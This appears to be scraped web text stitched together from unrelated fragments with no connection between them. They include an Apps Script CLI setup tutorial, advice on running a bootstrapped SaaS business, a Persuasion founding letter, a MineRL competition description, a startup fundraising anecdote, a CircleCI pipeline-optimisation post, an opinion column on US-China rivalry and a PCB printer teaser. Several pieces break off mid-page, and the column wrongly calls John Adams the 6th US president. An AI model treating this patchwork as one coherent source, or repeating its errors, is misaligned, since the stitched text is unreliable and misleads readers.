</code></pre><h3 id="before-you-can-run-it">before you can run it</h3>
<p>To use the google app script api, you need your own application that has a client key and secret. That means you have to create your own project, with all the right permission and all.</p>
<blockquote>
<p>❗ read and do each step carefully, all of these steps have to be completed before it will work</p>
</blockquote>
<ol>
<li>in the [app script setting][appscript-setting], turn on “Google App Script API”</li>
<li>create a new project on google <a href="https://console.developers.google.com/">console</a></li>
<li>enable the <a href="https://console.developers.google.com/apis/library/script.googleapis.com">app script api</a> for your project</li>
<li>in your new project, go on to the <a href="https://console.developers.google.com/apis/credentials/consent">oauth consent screen</a> (just fill in the form, it will be unverified, but it doesnt matter, you are the only one using it anyways)</li>
<li>in the [credentials page][consent-cred], create a new oauth and note down the client key and client secret somewhere</li>
<li>now you have to add your  key and secret in the environment somewhere as <code>GAS_KEY_ID</code> and <code>GAS_KEY_SECRET</code>
<ul>
<li>on linux, you can add <code>export GAS_KEY_ID=key_id_here</code> and <code>export GAS_KEY_SECRET=key_secret_here</code> to your <code>.bashrc</code> files</li>
<li>on windows you can add them as your system environments</li>
<li>however you get it to work, as long as you have these environment variables accessible to the script</li>
</ul>
</li>
</ol>
<h3 id="setting-it-up">setting it up</h3>
<ol>
<li>ensure that you have completed all the steps in the previous section</li>
<li>at this point, you should have <code>GAS_KEY_ID</code> and <code>GAS_KEY_SECRET</code> set in your environment</li>
<li>get the <a href="https://gitlab.com/snippets/1988224/raw">raw script</a> from gitlab</li>
<li>save it somewhere and make you sure can run it (add to path, make it executable, blah blah, …)</li>
<li>run <code>gas login</code>, you will be provided a link, navigate to that link in your browser</li>
<li>will you get to some unverified application page, go to that little link on the bottom left, and go ahead with it (it’s your own application anyways, it’s fine)</li>
<li>you will be redirected to a local page and your credentials should be saved. You can check it on <code>$HOME/gasrc.json</code> (<strong>note</strong>: on windows you might have to explicitly set the “HOME” variable, just windows things)</li>
<li>now, you should be able to start - create a new project in <a href="https://script.google.com/home">google app script</a> and follow along in the next section</li>
</ol>
<h3 id="demonstration-with-explanation-push-pull">demonstration with explanation (push pull)</h3>
<ol>
<li>open up your project, and go to the web editor</li>
<li>note the script id in “File &gt; Project Properties &gt; Info”</li>
<li>create and navigate to your project root on your local system</li>
<li>run <code>gas init script-id-here</code> with the script id</li>
<li>do a <code>gas login</code> if you havent done so in the previous step</li>
<li><code>gas pull</code>. All your projects files will be downloaded. There are 3 types of files, either <code>SERVER_JS</code> (downloaded as <code>js</code>), <code>JSON</code> and <code>HTML</code></li>
<li>make your changes, create new files, delete files, whatever you wish</li>
<li><code>gas push</code> to update your project. Only files of the extension <code>js</code>, <code>json</code> and <code>html</code> will be uploaded. (<strong>note</strong>: even files in directories will be uploaded; they will just have their path preprended to the file name)</li>
<li>Go back to your google app script editor and reload the pages, it should all be there, the new updates</li>
</ol>
<h3 id="demonstration-with-explanation-webapp-deploy">demonstration with explanation (webapp deploy)</h3>
<ol>
<li>go on to your project on app script</li>
<li>follow the steps <a href="https://developers.google.com/apps-script/guides/web">here</a>, and create the basic functions need to publish as a web app (basically a <code>doGet()</code> that returns a <code>TextOutput</code>)</li>
<li>go to “publish &gt; deploy as web app”, this will give us a basic deployment to get stared with</li>
<li>navigate to your local GAS project directory, pull all the updated files using <code>gas pull</code></li>
<li>run <code>gas deploy</code>, you should see project that has some “meta-web application” description on it</li>
<li>note down the deployment id, the long string of characters on the second line</li>
<li><code>gas deploy set deployment-id-here</code> this will set your default deployment, and whenever you run the deployment update, this will be the deployment it updates</li>
<li>make your changes, maybe change return of the <code>doGet</code> to add a smiley face, or anything really</li>
<li><code>gas deploy udp</code> this pushes your new code up, creates a new version and deploys it</li>
<li>check it, go to the link that points to your deployment, and see that your code has indeed changed (the smiley face, or whatever new you have added is there)</li>
</ol>
<h3 id="final">final</h3>
<p>cool stuff to mention, so that you can spot it in the <a href="https://gitlab.com/snippets/1988224">code</a></p>
<ul>
<li>you dun even need to be at the root directory to run the code, any sub directory will do (just like git)</li>
<li>we start a quick server just to deal with all the oauth stuff</li>
<li>we handle pagination as well, as an example <code>gas deploy proc -f</code> gets all the processes</li>
</ul>
<h3 id="code">code</h3>

        <div>

            

            <p>I wouldn't say I'm an expert, but Belle and I have made a SaaS product with web, Android, and iOS apps, starting from scratch, and over the years built it to the point where it pays us both to work on it full-time. That's my idea of success. I'm not interested in being wealthy, or taking venture capital, or scaling beyond the two of us. </p>
<p>Here are some things I've learned along the way. If you think you might like to do something along the lines of what I've described, perhaps you'll find these opinions useful, although I imagine most are not very novel. Many are related so forgive me for repeating myself. </p>
<p>All of these are based on my own experience and values and may be totally the wrong advice for you.</p>
<p><strong>It's okay to start with the technologies you know.</strong> In fact, I strongly recommend it. If you're good at JavaScript, write your backend in Node. If you make iOS apps, start with an app and use something like Firebase if you need server-side bits. Don't start by learning something new, you'll just make something that's already difficult that much harder. (Learn new stuff later, though. That's fine and keeps it fun.)</p>
<p><strong>Things really will go better if you build something you'll use yourself.</strong> Dogfood it. It'll also help you maintain an interest in building it once the novelty of having users and income wears off.</p>
<p><strong>YAGNI <small>(You Ain't Gonna Need It)</small> is a good aphorism but don't take it to mean you can only build what you need today and no more.</strong> I think it's fine to build things in a generic way you can extend. I feel fortunate that Exist's core is still fundamentally the same today, seven years later, because I tried to design a generic data model and integrations architecture that could account for the things we might add. Don't over-architect it, sure, but don't be short-sighted either.</p>
<p><strong>You don't need to go through an incubator or accelerator.</strong> You don't need external funding. These things are undoubtedly useful in some circumstances but they are marketed as a necessity, and even glamorous, because they make other people money. Don't chase status symbols for their own sake. Why give up equity? Why give your investors the means to make decisions for you? Their interests are not necessarily aligned with yours. I'm not saying never do it, just consider your needs instead of taking it as a given.</p>
<p><strong>You don't need to be a "startup".</strong> Your end goal doesn't have to be "CEO of a big tech company with lots of employees". There are viable alternatives and being an indie-sized business is quite a comfortable way to do things.</p>
<p><strong>Mentors are good for support when things are hard, but remember that the person who best understands what you want to do is you.</strong> If they give you conflicting advice, try to understand their viewpoint, and if you still think you know better, ignore it.</p>
<p><strong>If you can make it fit into your life, bootstrapping works fine.</strong> You might move a lot more slowly because you're only working on your product when you're not at your day job, but this doesn't have to be a huge disadvantage.</p>
<p><strong>More generally, you <em>can</em> do it your own way.</strong> We took a lot of actions contrary to the prevailing view of the time, partly just because I like to be contrary, and it worked out. That might just be a combination of luck and privilege, but it's evidence you can point to if someone says things like "you can't get by without an incubator", or "you can't compete with a venture-backed startup as a bootstrapped company of two people who do no marketing", for example.</p>
<p><strong>Don't underestimate persistence.</strong> I don't have a lot of time for PG these days but I do think there's a lot of truth to his saying, "Startups die of suicide, not homicide." We're still here because we kept going even when we weren't making enough money and it wasn't clear that we ever would. We've outlived many competitors, even some who appeared years later. If you just keep going you may eventually get where you want to be. If we'd "failed fast" because one year in we were making hardly any money, we'd probably both still work for other people. </p>
<p><strong>Be authentic.</strong> Be yourself, a human being with flaws who has likes and dislikes and bad days. Don't act like you're a big faceless entity. It won't make people trust you more. Just be you, and be honest if you fucked up, or if you're never going to add that feature, or if you added it because you personally wanted it and you don't care if anyone else did. Paradoxically, it can be better to be open with your users about making mistakes and breaking things than to appear to never break things.</p>
<p><strong>Be open.</strong> Share whatever you can. Be transparent about what you're working on, what you want to do next, how much you're making, and how you're feeling about it. A lot of the goodwill users have towards us is because we have an open roadmap and we publish user and income stats.</p>
<p><strong>Be empathetic.</strong> Try to relate to your users as one human to another. Make the effort to understand why they are angry, or rude, or just don't care about your thing. You will fail a lot, and they won't always deserve it, but a lot of good will come of it. Acknowledge their point of view. When we first opened our pre-launch waiting list for Exist, we got some pretty rude feedback about trying to vacuum up everyone's data to sell, or that our idea was dumb, or that we shouldn't be trying to charge for something nobody would pay for. In each case I tried to understand why someone would feel that way and honestly address their concerns. In nearly every case I succeeded in turning the interaction into a positive one and many of those people signed up. I don't always have the energy to do that any more, and you get better at knowing when to just let it go, but I still believe it's something to strive for.</p>
<p><strong>Be good at support.</strong> Man, the bar for support is just so low, especially for indie software. You've probably experienced emailing the developer of an app you use about a bug and just never getting a reply, right? Replying to support tickets alone probably puts you in the top 50% straight off the bat. Replying quickly, even better, and then caring about the issue and fixing it, would seriously push you into the top 10%. Unless you get a lot of support, it's not even that hard to do, and it's such a good way to make your users think well of you. Again, you'll probably lose the motivation to be prompt and kind over time, but it's always something to strive for.</p>
<p><strong>Listen to user feedback.</strong> User suggestions are useful, and if you track what's popular you'll definitely identify trends worth pursuing. Still, temper them with your own strong ideas about what you're making. Don't just add stuff because one person made a big fuss about your product being useless without it. Get comfortable telling people you are not adding their thing just because they asked for it. As a related point, the loudest users are usually not indicative of the whole.</p>
<p><strong>Get to know your users.</strong> If you are friendly, they will be friendly to you and care about you and your thing, and maybe you will care about them and their things too and you can be friends. Be generous if you can afford to, and probably even if you can't. </p>
<p><strong>Be open to your role changing.</strong> This is a pretty obvious one but you'll have to wear a lot of hats and it might turn out that someone needs to write lots of docs, or do a lot of regular support, and you thought you were just here to code the backend. Things can change and there'll probably be plenty of tasks where there's just nobody else to handle it.</p>
<p><strong>On the other hand, you probably can get away with not doing stuff you really don't want to do.</strong> For example, we don't really do much explicit marketing now because it was Belle's role and she stopped wanting to do it and switched to iOS development. As a compromise we recorded a podcast together irregularly but because I never enjoyed doing it we stopped that too. Would we be better off with more marketing? Almost certainly. But we can get away with not doing it because we hate it and we're established enough now from having been around for years and having done the work earlier. This probably won't translate to everything, for example you can't just not write docs if you make a developer tool, but perhaps you can find a compromise that's tolerable for you.</p>
<p><strong>If you do think you need marketing but you don't like the regular methods, you can try just boosting your personal profile.</strong> Write blog posts, go to your local meetups (when those are a thing again), share screenshots of what you're working on to social media. If that still feels too much like selling yourself (and I sympathise), you could try just doing regular release notes posts for your product, or highlighting technical stuff you're doing, or even just sharing user stats. It doesn't need to be "here's why this is so great", it's just a chance for your thing to be more visible.</p>
<p><strong>Being visible gives you more chances at being visible</strong>, for example people might want to interview you about your work. I like this approach because you can just answer questions honestly and it counts as marketing. </p>
<p><strong>Don't waste time on collaborations, opportunities to work together, or deals with big companies.</strong> Because that's all you'll get out of it — wasted time. In general, anyone you don't know who wants to "hop on a call" with you will only waste your time. Even if there's, like, <em>so much</em> synergy.</p>
<p><strong>I strongly recommend you charge everyone who uses your product.</strong> Free plans only get you freeloaders.</p>
<p><strong>If you get a chargeback, just accept it — you will never win your dispute.</strong> We initially disputed every chargeback and went to the effort to prove that the user had knowingly paid for and used our product. We never won. Just accept the chargeback and then cancel that user's subscription. If someone is going to take that route rather than contacting support or asking for a refund, it's easier just to let them go as a customer. </p>
<p><strong>Offer refunds gladly.</strong> It means more to the user to get a refund than it's worth to you …</p></div></div></div>

From Brasilia to Warsaw and from Delhi to Washington, authoritarian populists are attacking free speech, stoking the ugliest passions of bigots and racists, and concentrating power in their own hands. To safeguard the great cultural and political progress of the past half century, those of us who believe in the values of a free society need to rise to the fight of a lifetime.</p><p>At the very moment when it would be most important for those who oppose an emboldened far-right to speak with confidence and conviction, these same values are losing their luster among significant parts of the left. Companies and cultural institutions <a href="https://www.theatlantic.com/ideas/archive/2020/06/stop-firing-innocent/613615/">fire innocent people</a> for imaginary offenses; prominent voices alternate between defending cancel culture and denying its existence; and an astonishing number of academics and journalists proudly proclaim that it is time to abandon values like due process and free speech.</p><p>It would be easy, and not altogether wrong, to point the finger of blame for the erosion of democracy at its sworn enemies. But the truth is that part of the reason why these values are vulnerable is that so many of their defenders have themselves fallen short. </p><p>Too often, those of us who are committed to a free society lack convincing answers to pressing political questions, including the persistent disparities of race and class. Too often, those of us who seek to defend democracy against its enemies are deeply enmeshed in an establishment that gives people good reason to rebel against it. And too often, those of us who seek to mount a case for philosophically liberal values do so in an overly apologetic or unimaginative way.</p><p>This is why I have grown convinced that we need to build a new community of thinkers, activists, and citizens that is committed to defending and reinvigorating the values of a free and fair society. That is the goal of <em>Persuasion</em>.</p><p>A <a href="https://www.persuasion.community/p/our-board">remarkable collection of prominent writers, activists, and intellectuals</a> has already pledged to form the core of this community. We will publish regular articles that will help to refine and embolden our commitment to a free society. And we have already planned some amazing <a href="https://www.persuasion.community/p/persuasion-events">events</a> and <a href="https://www.persuasion.community/p/book-clubs">book clubs</a> that will allow members of this new community to debate the most important issues of the day—and build friendships with other people who are deeply passionate about this cause along the way.</p><p>So please join our community if you, too, share our founding values:</p><ul><li><p>We seek to build a free society in which all individuals get to pursue a meaningful life irrespective of who they are.</p></li><li><p>We believe in the importance of the social practice of&nbsp;persuasion, and are determined to defend free speech and free inquiry against all its enemies.</p></li><li><p>We seek to persuade, rather than to mock or troll, those who disagree with us.</p></li></ul><p>A free society is worth fighting for.

<p>We are holding a competition on sample-efficient reinforcement learning using human priors. Standard methods require 
months to years of game time to attain human performance in complex games such as Go and StarCraft. In our competition,
 participants develop a system to obtain a diamond in Minecraft using only four days of training time.

<p>The MineRL competition offeres a set of Gym environments paired with human demonstrations to provide participants with
the ability to tackle the difficult Minecraft sample efficiently. This year we are introducing a new 
vectorized action and observation space that obscures the agent’s actions to prevent participants from using domain
knowlege to solve the ObtainDiamond task!</p>

<h3> The Task: Obtain Diamond in Minecraft </h3>

<p>Minecraft is a 3D, first-person, open-world game centered around the gathering of resources and creation of structures and items. These structures and items have prerequisite tools and materials required for their creation. As a result, many items require the completion of a series of natural subtasks.</p>

<p>The procedurally generated world is composed of discrete blocks that allow modification. Over the course of gameplay, players change their surroundings by gathering resources and constructing structures.</p>

<p>In this competition, the goal is to obtain a diamond. The agent begins in a random starting location without any items, and receives rewards for obtaining items which are prerequisites for diamond.</p>

I found myself at a hotel with some friends. I was visiting Portland for a conference. Puppet’s first investment round — and mine! — was closing. The money was being deposited.</p>
<p>Have you seen a David Mamet movie, like <em>The Spanish Prisoner</em>? They’re fantastic. But eerie. Disquieting. They build up a story, brick by brick. Then they yank a few bricks away, exposing the whole story as a lie. Only a hollow truth remains, unrelated to your built up belief. It makes you question everything.</p>
<p>I’m waiting for the closing in this hotel, and I order a Macallan 18 to celebrate. This was back when it was only expensive, not egregious. I lift the glass, and I think:</p>
<p>The money is being deposited into my bank.</p>
<p>I <em>think</em> it’s a real bank.</p>
<p>I mean, they had, like, a website. And websites are pretty hard to… <em>wait a minute</em>.</p>
<p>Who introduced me to the bank?</p>
<p>The investors introduced me. They specifically wanted me to work with this bank. They’re the ones giving me the money. They wouldn’t say they’re giving me the money then give it to someone else. That’s a silly kind of fraud. I just have to trust them.</p>
<p>I sit there. Sipping my whiskey.</p>
<p>I <em>think</em> it’s a real bank.</p>
<p>I <em>think</em> I’m getting $2.25 million.</p>
<p>I had never seen a bank account with that many zeroes — and I still may not at that point! I have no idea what to do.</p>
<p>So I sit there. Savoring that delicious, delicious whiskey.</p>
<p>I didn’t mean to raise money. I was just focused on running the company. We had bootstrapped for almost four and a half years. I figured we were going it alone.</p>
<p>I had talked to people in the past about raising money. It was like <a href="https://quoteinvestigator.com/2011/04/18/groucho-resigns/">Groucho Marx’s joke</a> about clubs: I wouldn’t take money from the investors willing to give it to me. “Wow, I would love them as an investor,” you get nothing. Or, “I would happily give you money and ruin your life.” Hmm. Not really the deal I’m looking for.</p>
<p>One day at an event, an investor tracked me down. He said, I’d like to invest in your company.  I said, That doesn’t sound right. A lot of investors say, We should talk. He said: We should talk <em>on Monday</em>. That specificity made all the difference.</p>
<p>He made a very confusing offer: We would like to write a $1.75 million check into a $2 million round. I said, how can you be that bad at math and work in finance. He said, Go find other, rich people that you know to give you the rest of the money. I said, you are, literally, the only rich person I know. He said, I just joined this firm. I am not rich. Then we’re stuck, I said.</p>
<p>I lived in Nashville at the time. There are a bunch of rich people there. But they’re all musicians. They don’t do technology. We most emphatically did not hang out. We weren’t going to fill this round through my network.</p>
<p>Eventually, by connecting me to their network of rich people, I was able to raise $2.25 million. Mostly through luck not skill. I didn’t build a deck. I didn’t run a formal process. I didn’t pitch multiple investors to get competitive term sheets. I pretty much did the exact opposite of <a href="https://www.venionaire.com/fundraising-playbook/">the play book</a>. The investor who filled out the round turned me down at first, but I heard his wife persuaded him. I don’t know if she liked me or was cursing him.</p>
<p>Once all of the investors are in place, you wait.</p>
<p>The things you learn in your first round.</p>
<p>Closing takes about thirty days. Five rounds later, I have no idea why. It takes thirty days, and it costs $30,000. One of the terms in the term sheet you get from your investors states that you pay for closing. “We’re going to give you this money, and then you’re going to give some of it to the lawyers.” Investors cap the fees, and the lawyers <em>coincidentally</em> hit that exact number every time.</p>
<p>I honestly don’t know what the lawyers do at closing. The documents are massively long, but they’re pretty much the same. At a late-stage company, I can understand: There is diligence to do (although not by the lawyers), financial data to look through (done by analysts, not lawyers), customers to talk to (by the investors, not the lawyers). At an early stage, though, there just isn’t much information. I don’t know what they do.</p>
<p>But it takes thirty days. And costs thirty grand. Says so on the term sheet.</p>
<p>So you wait.</p>
<p>But when that waiting stopped, boy howdy did things move.</p>
<p>The money did get deposited. It was a real bank after all.</p>
<p>Within a month I’d moved from Nashville to Portland. Within two months, I had my next three employees. And within six months I had a team of ten.</p>
<p>Raising money set us off like a rocket. Bootstrapping for more than four years provided a fantastic foundation for quick growth.</p>
<p>Looking back, I’m glad we raised money. I only wish we had done it earlier.</p>

Let’s dive in:</p><h3 id="1-use-2nd-gen-convenience-images-for-quick-environment-spin-up">1. Use 2nd gen convenience images for quick environment spin up</h3><p>The “Spin Up Environment” step is responsible for creating the virtual environment in which your job will execute (hence “executor”). Pulling in an executor, in this example an entire Docker image, can be slow. Although you can specify a custom Docker image, CircleCI also provides <a target="_blank" rel="noopener noreferrer" href="https://circleci.com/docs/2.0/circleci-images/#next-generation-convenience-images">pre-made convenience images</a> that we have found to be very convenient.</p><p>CircleCI recently released a second-generation version of these convenience images, which promise faster spin-up times. The <a target="_blank" rel="noopener noreferrer" href="https://github.com/CircleCI-Public/cimg-base/blob/master/Dockerfile.template">cimg-base repository</a> documents everything that is installed in the base Docker Image. Because the convenience images are all built off of the same base image, they can cache very well <a target="_blank" rel="noopener noreferrer" href="https://circleci.com/blog/how-to-build-a-docker-image-on-circleci-2-0/">using Docker Layer Caching</a>.</p><p>In our example, the only change we need to make is to point to one of these new images in our <code>executors</code>. In our case, we can also remove our credentials used to access our private image:</p><div><pre><p><span>1</span><span>executors:</span></p><p><span>2</span><span>   ci-node:</span></p><p><span>3</span><span>     docker:</span></p><p><span>4</span><span></span><span>-     - image: 123456789.dkr.ecr.eu-west-1.amazonaws.com/ci-node:our5ha</span><span></span></p><p><span>5</span><span></span><span>+     - image: cimg/node:14.3</span><span></span></p><p><span>6</span><span> </span></p><p><span>7</span><span> workflows:</span></p><p><span>8</span><span>   main_workflow:</span></p><p><span>9</span><span>     jobs:</span></p><p><span>10</span><span></span><span>+      - jest-unit</span><span></span></p><p><span>11</span><span></span><span>-      - jest-unit:</span><span></span></p><p><span>12</span><span></span><span>-         # Give this job AWS credentials to access our private Docker images</span><span></span></p><p><span>13</span><span></span><span>-         context: dev-ctx</span></p></pre></div><p>The results are pretty dramatic when the cache hits:</p><div><p><img src="https://images.ctfassets.net/zp9m00phuodm/4ramSJxcaUSP3OekcYBkRK/9fac31c12fdcd24b12a2a0a66056c72e/1j-4V-pGdkkTL6bRMc4LkeRZqINrhDWebZzn8j9E.png" alt="CircleCI: with cache hits."></p></div><p>Even when the cache doesn’t hit, there are usually enough layers cached that spinning up the environment now takes less than 15 seconds (down from 30-50 seconds before).</p><p>Even more helpful than this speed, the new convenience images are Debian-based. This allows us to use Unix tools that our developers are familiar with, like the package manager <code>apt</code>, instead of the sometimes-confusing Alpine <code>apk</code> (Alpine does not include common tools like <code>bash</code> or <code>jq</code> by default).</p><h3 id="2-use-shallow-clones-for-swift-code-checkout">2. Use shallow clones for swift code checkout</h3><p>Repositories balloon over time, especially if you use a monorepo as we do. Even if the file size at HEAD is kept relatively small, <a target="_blank" rel="noopener noreferrer" href="https://stackoverflow.com/questions/5613345/how-to-shrink-the-git-folder">past file blobs can stick around in the .git folder</a>. One of the best ways to speed up <code>git clone</code> commands is to use a <a target="_blank" rel="noopener noreferrer" href="https://www.perforce.com/blog/vcs/git-beyond-basics-using-shallow-clones">shallow checkout</a>.</p><p>There are a few open-source <a target="_blank" rel="noopener noreferrer" href="https://circleci.com/docs/2.0/orb-intro/">CircleCI Orbs</a> that make this optimization easy to implement. In particular, <a target="_blank" rel="noopener noreferrer" href="https://circleci.com/orbs/registry/orb/guitarrapc/git-shallow-clone">we like this one</a> because it lets us customize any git settings we’d like.</p><p>To use this orb, at the top of your config, add:</p><div><pre><p><span>1</span><span>orbs</span><span>:</span><span></span></p><p><span>2</span><span>  </span><span>git-shallow-clone</span><span>:</span><span> guitarrapc/git</span><span>-</span><span>shallow</span><span>-</span><span>clone@2.0.3</span></p></pre></div><p>Then replace <code>- checkout</code> in all your jobs with <code>- git-shallow-clone/checkout</code>.</p><p>When we made this change, our checkout step dropped from 15-25 seconds down to 3-5 seconds just like that!</p><p>It’s worth noting that there are two reasons why someone might <em>not</em> use shallow checkouts:</p><ol><li><p><strong>Some Git commands are not supported by shallow checkouts.</strong>
These include fetching information from multiple branches or from deep in the Git history.</p></li><li><p><strong>Git providers sometimes rate limit shallow checkouts.</strong>
This only becomes an issue for large workflows or frequent runs.</p></li></ol><p>That said, for the majority of use cases, shallow checkouts are safe to use and can save a significant amount of time.</p><h3 id="3-untar-in-ram-for-rapid-cache-restores">3. Untar in RAM for rapid cache restores</h3><p>Caching <em>can</em> be a wonderful, run-time-saving thing. That said, accessing our large <code>node_modules</code> folder (nearly 300MB) from the CircleCI cache could sometimes take longer than starting from scratch with a fresh <code>yarn install</code>.</p><p>Internally, CircleCI manages caches and workspaces by putting files into a tarball and uploading that compressed tar file into Amazon S3. When you request a cache, CircleCI downloads the tar file from S3, validates that the file is the one that was requested, and then untars it.</p><p>Because <code>node_modules</code> can have thousands of files, even with lightning-fast network speeds, disk IO can slow down the untar process significantly.</p><p>In our example, restoring our cache took 1:07. Only 6 of those seconds were spent downloading and validating, while decompressing the files took over a minute. In the worst-case scenario, this cache restore step could take up to 3 minutes to complete.</p><div><p><img src="https://images.ctfassets.net/zp9m00phuodm/6Jtu3bfEugHoXeUokHzzag/d747dd8b395c2fa20910eb5fb2c69538/1i1ZdxE38xmjY57AFoLK9hvEqWZ_fshqhPd6_gCI.png" alt="CircleCI: Untar in RAM."></p></div><p>Lucky for all of us, as of the <a target="_blank" rel="noopener noreferrer" href="https://circleci.com/changelog#ram-disks">April 7th, 2020 CircleCI release</a>, CircleCI supports <a target="_blank" rel="noopener noreferrer" href="https://circleci.com/docs/2.0/executor-types/#ram-disks">mounted RAM disks</a> on Docker executors.</p><p>Using these RAM disks has dropped the <code>restore_cache</code> run time down to a consistent 10–20 seconds.

While the larger <code>resource_class</code> costs more money, because our jobs now finish in about half the time, the cost difference has been negligible.</p><p>And while your mileage may vary, give larger instance sizes a try and see if they work for your use case.</p><h3 id="4-parallelize-jobs-for-expedited-workflows">4. Parallelize jobs for expedited workflows</h3><p>Improved caching and access to caches is all very well and good, but when dependencies change, caches need to be updated. In these cases, the <code>yarn install</code> step will need to do more work, as well as the <code>Saving Cache</code> step, adding an extra minute or so to our pipelines. To solve this problem, we decided to play around with parallelization.</p><p>First, we tried saving the cache in a single job separate from all of our other jobs. Each subsequent job could then restore the cache from its saved location in the workspace instead of saving the cache as part of all of our jobs, including the jest tests:</p><div>
  <p><img src="https://images.ctfassets.net/zp9m00phuodm/Uraphwbv2Qr5ch8w5Dc3g/cc782477babf02e39560d899b75a97c7/Before.svg" alt="CircleCI: before restore cache."></p></div><p>Became</p><div>

It could take almost 2 minutes to store our dependencies in the workspace, and that step needed to complete before we started our jest job.</p><p>To get around this problem, we changed the way we split our jobs. We divided them into first-level jobs that can rely on the global cache for dependencies (and don’t depend on the completion of other jobs) and everything else. Then we added a new first-level job, <code>cache-deps</code>, that cached all dependencies for any job that ran after the first level.</p><p>Our new pipeline runs all first-level jobs immediately, and then anything with a dependency. This division has the added benefit that most of our first-level jobs no longer need to write out to the cache, as <code>cache-deps</code> now takes care of that.</p><p>In our config, this looks like:</p><div><pre><p><span>1</span><span>jobs:</span></p><p><span>2</span><span></span><span>+  cache-deps:</span><span></span></p><p><span>3</span><span></span><span>+    parameters:</span><span></span></p><p><span>4</span><span></span><span>+      key:</span><span></span></p><p><span>5</span><span></span><span>+        type: string</span><span></span></p><p><span>6</span><span></span><span>+    executor: ci-node</span><span></span></p><p><span>7</span><span></span><span>+    steps:</span><span></span></p><p><span>8</span><span></span><span>+      - git-shallow-clone/checkout</span><span></span></p><p><span>9</span><span></span><span>+      - restore_cache:</span><span></span></p><p><span>10</span><span></span><span>+          keys:</span><span></span></p><p><span>11</span><span></span><span>+            - &lt;&lt; parameters.key &gt;&gt;</span><span></span></p><p><span>12</span><span></span><span>+      - run: yarn install</span><span></span></p><p><span>13</span><span></span><span>+      - save_cache:</span><span></span></p><p><span>14</span><span></span><span>+          paths:</span><span></span></p><p><span>15</span><span></span><span>+            - node_modules</span><span></span></p><p><span>16</span><span></span><span>+            - packages/admin-dashboard/node_modules</span><span></span></p><p><span>17</span><span></span><span>+            - packages/core/node_modules</span><span></span></p><p><span>18</span><span></span><span>+            - ...</span><span></span></p><p><span>19</span><span></span><span>+      …</span></p></pre></div></div></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>A while ago, Alex Lo from the South China Morning Post kindly quoted me in one of his columns, and I am happy to return the favour. In his&nbsp;<a href="https://www.scmp.com/comment/opinion/article/3090798/must-united-states-demonise-china">piece</a>&nbsp;last week, Lo raised an interesting aspect. America has always needed an enemy, or so he put it, and China was but the latest in a long series of “monsters” in need of destruction. His introductory quote of John Adams, the 6th US president, warning against such behaviour had long been dismissed and become a blueprint for America’s engagement in the world.</p>

<p>Lo goes on saying that every post-War president, including Donald Trump, went into office trying to heed Adams’ wise advice but ended up doing the opposite. We can see the temptation. When your military is deployed in more than 150 countries in a world that has fewer than 200, one may claim not to run an empire, and America has obviously not done that in the textbook sense of it, but according to Lo it obviously becomes harder to justify your presence regardless what fanciful claims you make.</p>

<p>When you have a democracy, public opinion must be managed or, in some cases, even manufactured. And these days, America seems to be in the business of demonising China to do just that and deflect from domestic issues. Lo thinks that simply existing as a rising power, such as China, is enough to make someone an enemy, which must be isolated, demonised, contained, if not destroyed. How Washington has tried to use Hong Kong as a pressure point and factor in this hegemonic calculus is remarkable.</p>

<p>But here it comes what Lo is saying that absolutely resonates… Creating an enemy requires the opposing entity to behave like one or declare itself as one. The issue with this is, does China want to be America’s enemy? From the evidence of China’s actions and reactions, one wouldn’t get the impression. Despite the poking and provoking of Trump’s vassals as well as the entire Washington establishment itself Beijing hasn’t exactly taken the bait and manoeuvred skillfully across the minefield.</p>

<p>Isolating China as Mike Pompeo trumpets to be America’s foremost policy is easier said than done on a globe of many stakeholders. It would inevitably mean some sort of a Cold War, but China can’t be compared to the Soviet Union in any respect. Who would assemble to constitute one bloc versus the other? Washington by way of modern-day mantras such as America First doesn’t seem to be able to recruit an incremental number of countries to form a bloc.</p>

<p>To be sure, there are a few allies that would go out of their way to walk in step with America. A die-hard one these days appears to be Australia that under their current government seems to have sold their soul to America’s cause of having an enemy, or otherwise called the Indo-Pacific initiative. There may be others, but they haven’t come forward as carrying Washington’s water. Apart from possibly the UK, forget about Europe. India more and more seems inclined to play ball, but don’t bet on it.</p>

<p>On the flip side, China isn’t even interested in forming a bloc, and it may not need to in the first place. As long as Beijing’s trading partners behave in the context of an open and multilateral word order, why have a bloc? Readers may think I forgot Japan and South Korea as US allies in Indo-Pacific. I wouldn’t be too sure about that. Tokyo and Seoul have been careful not to provoke Beijing, much as the ASEAN countries will not be lured into taking sides. Trade and regional integration are top on their minds.</p>

<p>Europe is developing a similar mindset gradually and under the duress of Trump’s bullying. Never mind what formal condemnations echo from Brussels with regards to China’s presence and actions. The reality is that China’s economy has been least impacted by the health crisis, and who wouldn’t want to partner with the top dog in global business, for maybe years to come. Pragmatism against the backdrop of a sole superpower in relative decline seems to be the motto going forward.</p>

<p>While Trump and Joe Biden are busy greasing their propaganda machines and attempt to outperform each other bashing China, as they have little else to show for but the declared enemy, vast parts of the rest of the world are moving on. It’d be too nonchalant to claim that all is business as usual for the Chinese, but apart from building its own mouthpieces on social media the Beijing leadership has distinctly avoided direct confrontation with mostly Pompeo’s attack tirades.</p>

<p>Instead, the moves from Beijing have been a lot more subtle, such as leaving no doubt about the territorial integrity of China, rushing its contingency plans in response to US tech bans, building on its alliance with Russia, schmoozing European countries into commercial partnerships, veering trade away from America to ASEAN, cultivating a more constructive relationship with Japan and Korea, and stubbornly pursuing the generational Belt and Road and the commensurate expansion of its ecosystem.</p>

<p>If you think about it, no sane person would call any of these actions outright anti-American, apart from the American government itself of course. Anything and everything Beijing does, as a matter of the country’s existential needs or as a reaction to any bullying, is deemed a provocation on Washington’s end. It’s not even a question of chicken and egg. This is what propaganda is and does. It creates a narrative that the masses and stakeholders are being spoon-fed, no matter how much truth there is.</p>

<p>China doesn’t want conflict. Why would it? Neither is it in any danger of trying to become an imperial power and take over the world as some mainstream media have insinuated. All China wants is to further its country and people, a legitimate quest. Naturally, its growth changes the global equation, and that is being perceived as a threat. But is China an enemy by definition? Well, in the world of one sole superpower it has the potential of becoming one. In a multilateral and -polar world of the future, however, it doesn’t need to be.</p>

<h3>Modified printer simplifies home PCB fabrication</h3>
<p> — <span>July 2nd, 2020</span>

<p>In many locations you can get PCBs made fast, cheap, and of very good quality. In Brazil, where Vítor Barbosa lives, this isn’t the case, so he built a&nbsp;“<a href="https://hackaday.io/project/171775-haxmark460-home-pcb-printer">haxmark460</a>” PCB printer&nbsp;to help manufacture circuits at home.</p>
